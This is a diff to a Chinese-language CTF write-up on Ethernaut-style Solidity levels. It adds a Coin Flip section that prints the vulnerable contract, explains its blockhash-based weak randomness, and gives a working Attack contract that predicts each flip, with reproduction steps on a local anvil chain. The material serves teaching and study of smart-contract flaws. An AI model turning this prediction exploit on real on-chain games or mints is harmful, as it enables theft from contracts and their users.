@@ -49,7 +49,7 @@ contract Fallback {
 }
 ```
 
-## 目标
+目标:
 
 Look carefully at the contract's code below.
 
@@ -196,3 +196,100 @@ contract Fallout {
 ![image-20240328104722351](README.assets/image-20240328104722351.png)
 
 # Coin Flip
+
+## 漏洞代码
+
+```
+题目提示：这是一款抛硬币游戏，您需要通过猜测抛硬币的结果来建立连胜。 要完成此关卡，您需要使用您的心灵能力连续 10 次猜测正确的结果
+```
+
+```
+//题目代码
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+## 分析&攻击
+
+代码比较简单，consecutiveWins是记录胜利次数的，输入bool _guess，和根据区块地址随机计算的side值比对，如果猜对了就consecutiveWins递增，错了consecutiveWins归零
+
+看flip函数代码发现用的blockhash函数，`blockhash(block.number-1)`作为种子来获取随机数，容易想到是伪随机带来的风险，参考：
+
+https://github.com/AmazingAng/WTF-Solidity/blob/main/S07_BadRandomness/readme.md
+
+https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random
+
+![image-20240410152157581](README.assets/image-20240410152157581.png)
+
+攻击代码也很简单，直接把漏洞代码里面的随机数计算复制一遍，因为`attackMint()`和`flip()`将在同一个区块中调用，`blockhash`和`block.timestamp`是相同的，利用他们生成的随机数也相同。
+
+```
+contract Attack {
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    function attackMint(CoinFlip nftAddr) external {
+        // 提前计算随机数
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        if (lastHash == blockValue) {
+            revert();
+        }
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool mySide = coinFlip == 1 ? true : false;
+        // 利用 计算的 攻击
+        nftAddr.flip(mySide);
+    }
+}
+```
+
+复现过程：
+
+（1）我们用anvil启动一个本地链，5s生成一个新区块（据说 Remix 自带的 Remix VM不支持 `blockhash`函数，我没试，我直接本地测比较保险，因为remix vm还有其他bug）：
+
+anvil --block-time 5
+
+![image-20240410152613519](README.assets/image-20240410152613519.png)
+
+remix ide的env选本地的
+
+![image-20240410152641392](README.assets/image-20240410152641392.png)
+
+
+
+（2）然后正常部署两个合约，你可以先试试手动flip，是很难纯靠猜连胜十次的，但是可以通过attackMint函数一直连胜
+
+![image-20240410152749631](README.assets/image-20240410152749631.png)
+
+attackMint函数可能提示这个，暂时不用管，不影响复现
+
+![image-20240410151604930](README.assets/image-20240410151604930.png)
